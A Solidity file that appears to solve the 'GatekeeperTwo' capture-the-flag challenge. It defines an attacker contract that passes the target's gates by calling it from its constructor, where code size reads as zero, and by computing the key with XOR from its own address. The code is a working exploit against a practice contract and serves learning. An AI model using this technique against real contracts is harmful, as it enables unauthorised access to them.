// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    IGatekeeperTwo challenge;

    constructor(address challengeAddress) {
        challenge = IGatekeeperTwo(challengeAddress);

        // during contract construction, extcodesize returns 0   
        // a ^ b = c => a ^ c = b     
        // msg.sender = address(this)
        // require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max); 
        challenge.enter(bytes8(gateKey));
    }
}